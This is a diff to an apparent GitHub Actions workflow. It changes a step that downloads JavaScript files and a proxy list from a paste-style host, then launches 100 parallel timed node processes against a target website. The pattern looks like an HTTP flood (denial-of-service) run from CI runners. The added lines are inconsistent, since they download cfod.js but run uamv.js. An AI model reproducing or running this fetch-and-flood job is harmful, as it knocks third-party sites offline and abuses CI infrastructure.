@@ -15,11 +15,12 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://curl.by/-ZDB0/raww.js
-          chmod +x raww.js
+          wget https://curl.by/99kBl/cfod.js
+          wget https://curl.by/zCzT3/proxy.txt
+          chmod +x cfod.js
           PIDS=()
           for i in {1..100}; do
-            timeout 85 node raww.js http://45.141.150.78/ 85
+            timeout 85 node uamv.js https://hexbear.xyz/ 10 90 80
             PIDS+=($!)
           done
           
